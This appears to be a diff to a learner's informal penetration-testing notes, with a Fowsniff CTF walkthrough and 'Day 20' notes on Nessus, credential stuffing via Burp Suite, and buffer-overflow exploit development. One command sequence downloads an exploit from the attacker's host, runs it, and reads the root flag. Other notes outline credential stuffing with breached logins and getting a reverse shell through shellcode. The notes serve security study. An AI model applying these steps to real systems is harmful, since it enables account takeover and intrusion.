@@ -73,8 +73,32 @@ Fowsniff CTF: Identifying target host by using the Netdiscover utility
               Transferring exploit on target machine and exploiting
               Reading flag file
               
+              
 <<cd /tmp/ >>
 <<wget 192.168.1.107/exploit >>
 <<chmod +x exploit >>
 <<./exploit >>
 in tmp do id, cat /root/flag to get flag
+
+
+Day 20:
+Nessus: vulnerability scanner 
+go to their website n download unfortunately no disk space
+its like an automated tool and u mark all checkboxes it tries to scan and show version of all top vulnerabilities on its own n then u can click on each n see
+
+credential stuffing:injecting breached ccount credentials in hopes of account takeover
+use foxy proxy,burpsuit,in tht pitchfort, set list of emails n passwds n use payload to attack n see
+do it one or two at a time coz ella ottige madidre dos attack agi lock agbodu
+
+Exploit devpt:
+install vulnserver on windows and immunity debugger
+buffer overflow: normal buffer space exceed adaga, content goes to extended instruction pointer return address which can be used to pt to malicious code tht 
+gives us a reverse shell
+steps in buffer overflow: spiking:find vuln part of pgm
+                           fuzzing:trying to inject something to brk in
+                           finding offset i.e at which part u were able to brk in
+                           using offset to overwrite eip
+                           cleanup:finding right char, module
+                           generate malicious shell code to get rev shell n pt eip to get root
+                           
+
